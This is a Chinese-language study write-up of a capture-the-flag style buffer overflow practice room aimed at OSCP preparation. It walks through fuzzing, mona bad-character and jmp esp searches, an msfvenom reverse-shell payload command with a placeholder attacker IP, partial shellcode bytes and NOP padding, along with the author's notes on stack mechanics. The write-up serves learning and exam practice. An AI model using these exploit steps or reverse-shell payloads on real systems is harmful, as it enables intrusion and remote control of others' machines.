# Buffer Overflow

相对较难，需要有较好的计组底子

缓冲区溢出基础：https://tryhackme.com/room/bof1

关于国内的博客讲的非常好的一篇文章，讲的很透彻很仔细：https://www.cnblogs.com/02SWD/p/15952483.html

---

### 请注意，这间客房不从头开始教授缓冲区溢出。它旨在帮助OSCP学生，并提请他们注意mona的一些功能，这将节省OSCP考试的时间。

我们将借助mona完成学习

### Overflow 1

    !mona config -set workingfolder c:\mona\%p

首先就是通过fuzz找到大概多少字节会导致缓冲区溢出使程序崩溃

我们可以通过构造一些随机字符，并且长度是上面fuzz的结果，我们可以使用一些小脚本帮助我们生成一些随机字符串：

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>

然后再次运行exploit再次造成程序崩溃，然后借助mona查找寄存器：

    !mona findmsp -distance <offset>

表示我们将从哪个位置开始查找，我们选择在我们缓冲区溢出的那个位置开始找，即上面fuzz的结果

Mona 应显示一个包含命令输出的日志窗口。如果没有，请单击“窗口”菜单，然后单击“日志数据”以查看它（选择“CPU”以切换回标准视图）。

在此输出中，您应该看到一行，其中指出：

    EIP contains normal pattern : ... (offset XXXX)

现在我们就已经知道了eip的开头位置，我们重新修改exploit的溢出的随机数据，不再使用上面fuzz的结果，而是使用"这里的eip offset"

这意味着我们将会使用随机数据一路填充到"这里的eip offset"，然后我们就可以控制该值

#### 个人理解：由于这里已经被我们填充的数据造成溢出了，所以这里的eip offset应该就是我们的函数返回地址

现在我们先使用随机数据填充 如：BBBB

### 寻找坏角色

使用 mona 生成字节数组，并通过以下方式排除空字节 （\x00） 违约。请注意生成的 bytearray.bin 文件的位置（如果工作文件夹是根据本指南的 Mona 配置部分设置的，则位置应为 C：\mona\oscp\bytearray.bin）。

    !mona bytearray -b "\x00"

现在生成一串与 字节阵列。以下 python 脚本可用于生成字符串 从 \x01 到 \xff 的坏字符数：

    for x in range(1, 256):
        print("\\x" + "{:02x}".format(x), end='')
    print()

更新 exploit.py 脚本，并将有效负载变量设置为脚本生成的错误字符字符串。

在免疫中重新启动 oscp.exe，然后再次运行修改后的 exploit.py 脚本。记下 ESP 寄存器指向的地址，并在以下 mona 命令中使用它：

    !mona compare -f C:\mona\oscp\bytearray.bin -a <address>

应该会出现一个弹出窗口，标有“mona 内存比较结果”。如果没有，请使用“窗口”菜单切换到它。该窗口显示比较结果，指示内存中与生成的 bytearray.bin 文件中的字符不同的任何字符。

#### 并非所有这些人都是坏人！有时 badchar 也会导致下一个字节损坏，甚至影响字符串的其余部分。

列表中的第一个 badchar 应该是空字节 （\x00），因为我们已经将其从文件中删除。记下任何其他内容。在 mona 中生成一个新的字节数组，指定这些新的 badchar 以及 \x00。然后更新 exploit.py 脚本中的有效负载变量并删除新的坏字符。

在免疫中重新启动 oscp.exe，然后再次运行修改后的 exploit.py 脚本。重复 badchar 比较，直到结果状态返回“未修改”。这表明不再存在坏字符。

### 寻找跳跃点

使用 oscp.exe无论是正在运行还是处于崩溃状态，请运行以下 mona 命令，确保使用您标识的所有坏字符（包括 \x00）更新 -cpb 选项：

    !mona jmp -r esp -cpb "\x00"

此命令查找所有“jmp esp”（或等效）指令，其地址不包含任何指定的坏字符。

### 我理解了很久，看了很多资料，才明白

然后选择其中一条jmp esp地址将其覆盖return address

#### 由函数调用过程可知，一般情况下，ESP中地址总是指向系统栈且不会被溢出的数据破坏。函数返回时，ESP所指的位置是淹没的返回地址的下一位（子函数平衡栈ret n时，ESP将指向下n位）。

### https://blog.csdn.net/yajuanpi4899/article/details/120944213

开始进行出栈读写操作：eip=esp，eip将esp的地址中指向的命令进行读取，逐步出栈，此时esp开始往低地址位靠近，当esp=ebp时，ebp读取现位置中存储的地址数据发生跳转，跳到父函数ebp处。

此时esp继续出栈，获取return addr，eip跳转至父函数栈顶位置，跳跃后eip继续从esp所含数据开始执行命令，就可以完成eip的函数执行步骤即：（此处要注意ret：即pop eip）

#### 根据前面我的个人理解，加上文章的引导。所以，由于函数的返回地址被我们填充为了指向jmp esp指令的地址，当eip从栈顶一路到栈底，也就是到这的时候将会去执行jmp esp指令，而这个时候，esp指向的地址恰好是父函数的栈顶，也就是我们shellcode开始的位置，所以我们的shellcode将会被执行。

### 生成Payload

在 Kali 上运行以下 msfvenom 命令，使用您的 Kali VPN IP 作为 LHOST，并使用您识别的所有坏字符（包括 \x00）更新 -b 选项：

    msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c

使用以下表示法复制生成的 C 代码字符串并将它们集成到 exploit.py 脚本有效负载变量中：

    payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
    "\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
    ...
    "\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
    "\x19\x53\xd0\x92\x19\x53\x2e\x1d")

### 预置 NOP

由于编码器可能用于生成有效负载，因此您将需要内存中的一些空间来解压缩有效负载本身。为此，可以将填充变量设置为 16 个或 <b>更多</b> “无操作”（\x90） 字节的字符串：

    padding = "\x90" * 16

现在我们的完整payload看起来像是这样的：

从缓冲区一直填充到栈底的return address，然后将jmp esp地址覆盖return address，而return address的后面就是我们的 NOP + shellcode，即父函数的栈顶。

---

### Overflow 2

按照套路先fuzz一波，在700字节的时候程序崩了，

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700

    !mona findmsp -distance 700

得到的结果是634

#### 查找坏字符

首先\x00除掉：

    !mona bytearray -b "\x00"

得到结果：00 23 3c 3d 83 84 ba bb

#### 并非所有这些人都是坏人！有时 badchar 也会导致下一个字节损坏，甚至影响字符串的其余部分。

挨个找：

    把23去掉，24没了，23是坏的。
    !mona bytearray -b "\x00\x23";exploit也去掉\x23

    把3c去掉，3d没了，3c坏的。
    !mona bytearray -b "\x00\x23\x3c";

    以此类推

最终答案：00 23 3c 83 ba

把\x01去掉，因为这是被\x00影响的

---

## 后面的八个练习都是差不多这样的，基本没什么两样，所以后面的就不写了，有两个例子足够了，后面都是一样的，就是慢慢挨个挨个排

（例子）方法：

    1.把07在脚本里面删了，坏字符串这里07还在上榜，08没了；07是坏的
    2.把08从脚本里面删了，07还在坏字符串榜上，08也上榜了，07是坏的
    3.把08从脚本里面删了，07、08都在，还多个09；07是坏的（除非07、08确定是好的）
